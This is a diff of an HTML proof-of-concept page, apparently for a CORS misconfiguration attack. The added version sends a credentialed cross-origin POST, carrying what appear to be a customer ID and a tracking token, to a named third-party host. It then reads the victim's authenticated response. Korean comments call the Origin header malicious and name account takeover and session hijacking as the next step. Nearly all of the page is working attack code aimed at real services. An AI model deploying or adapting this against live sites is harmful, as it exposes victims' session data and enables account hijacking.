@@ -3,38 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Exploit Demo</title>
+    <title>CORS Exploit POC</title>
 </head>
 <body>
-    <h1>CORS Exploit Demo</h1>
-    <pre id="output">Loading...</pre>
+    <h1>CORS Exploit Demonstration</h1>
+    <pre id="output">Sending request...</pre>
     <script>
-        
-        function fetchCORSData() {
-            fetch("https://content-api-prod.nba.com/public/1/leagues/nba/blackouts?zip=30067", {
-                method: "GET",
-                credentials: "include",
-                headers: {
-                    "Origin": "https://stargazer0.github.io" 
-                }
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error(`HTTP error! Status: ${response.status}`);
-                }
+        // CORS Exploit Request
+        fetch("https://remitly.tod8mp.net/xur/10408", {
+            method: "POST",
+            credentials: "include", // 쿠키를 포함한 자격 증명을 함께 전송
+            headers: {
+                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "Origin": "https://stargazer0.github.io" // 악의적인 Origin 헤더
+            },
+            body: "_ir=U81%7C%7C1724675136005%7Ce436e5b4&custid=0413d465200d90b9d46a172afe2a6039"
+        })
+        .then(response => {
+            if (response.ok) {
                 return response.json();
-            })
-            .then(data => {
-                document.getElementById("output").textContent = JSON.stringify(data, null, 2);
-            })
-            .catch(error => {
-                document.getElementById("output").textContent = `Error: ${error.message}`;
-                console.error('Fetch error:', error);
-            });
-        }
-
-        // Initiate fetch when page loads
-        document.addEventListener("DOMContentLoaded", fetchCORSData);
+            } else {
+                throw new Error(`HTTP error! Status: ${response.status}`);
+            }
+        })
+        .then(data => {
+            document.getElementById("output").textContent = `Request succeeded: ${JSON.stringify(data)}`;
+            console.log("Data received:", data);
+            // 데이터 처리: 예를 들어, 계정 탈취나 세션 하이재킹
+        })
+        .catch(error => {
+            document.getElementById("output").textContent = `Request failed: ${error.message}`;
+            console.error("Error:", error);
+        });
     </script>
 </body>
 </html>
